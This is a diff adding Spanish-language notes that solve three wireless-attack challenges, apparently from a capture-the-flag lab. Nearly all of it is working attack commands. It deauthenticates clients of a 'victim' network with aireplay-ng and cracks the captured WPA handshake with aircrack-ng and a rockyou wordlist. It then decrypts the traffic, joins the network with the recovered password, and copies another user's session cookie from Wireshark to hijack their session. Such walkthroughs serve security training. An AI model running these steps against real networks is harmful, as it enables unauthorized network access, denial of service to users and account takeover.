@@ -19,3 +19,63 @@ wpa_supplicant -Dnl80211 -iwlan1 -c wifi-old.conf -> Conectarnos al wifi
 dhclient wlan1 -v -> Pedir IP al wifi para poder usarla
 ============================================================
 
+CHALLENGE 8
+============================================================
+airodump-ng wlan0mon -> Para conseguir el canal de donde esta conectada la wifi victima
+airodump-ng wlan0mon -c 6 -> Para sacar la mac de la wifi victima
+F0:9F:C2:71:22:12
+
+-- Se hacen a la vez --
+airodump-ng wlan0mon -c 6 --wps -w scan8 -> Creamos una captura del trafico
+aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon -> Desconectamos a la gente para que se conecten y capturar la clave al conectarse
+------------------------
+
+aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt -> Crackeamos la contraseña de dicho wifi introduciendo su index
+============================================================
+
+CHALLENGE 9
+============================================================
+airodump-ng wlan0mon -c 6 --wps -w scan8 -> Creamos una captura del trafico
+airdecap-ng -e wifi-mobile -p starwars1 scan8-01.cap -> Captura y desencripta wifi a la vez
+wireshark scan8-01-dec.cap -> abrir el wireshark para poder ver el trafico
+
+TIP
+en wireshark -> edit>preferences>columns y crearemos dos columnas, source port y destination port (cambiamos el tiempo a dia mes y año con hora) y quitamos el no, quedaria -> time | src port | des port  | source | destination| protocol| length | info
+
+Vemos el que tenga puerto 80 y no sea el .1 ya que este es el del router
+===============================================================
+
+CHALENGE 10
+===============================================================
+
+-- Se hacen a la vez --
+airodump-ng wlan0mon -c 6 --wps -w scan8 -> Creamos una captura del trafico Capturamos el trafico para sacar el protocolo del wifi (ENC)
+aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon -> Desconectamos a la gente para que se conecten y capturar la clave al conectarse
+------------------------
+
+aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt -> Crackeamos la contraseña de dicho wifi introduciendo su index
+airdecap-ng -e wifi-mobile -p starwars1 scan8-01.cap -> Captura y desencripta wifi a la vez
+
+nano wifi-mobile.conf -> Creamos archivo de configuracion
+
+-----
+network={
+	ssid="wifi-mobile"
+	psk="starwars1"
+	key_mgmt=WPA-PSK
+	proto=WPA2
+}
+-----
+
+wpa_supplicant -Dnl80211 -iwlan1 -c wifi-mobile.conf -> Conectarnos al wifi
+dhclient wlan1 -v -> Pedir IP al wifi para poder usarla
+
+wireshark scan8-01-dec.cap -> una vez en el wireshark sacamos la cookie de alguien que se haya conectado al servidor 
+Copiamos y pegamos la cookie en nuestro navegador y recargamos 
+==============================================================
+
+
+
+
+
+
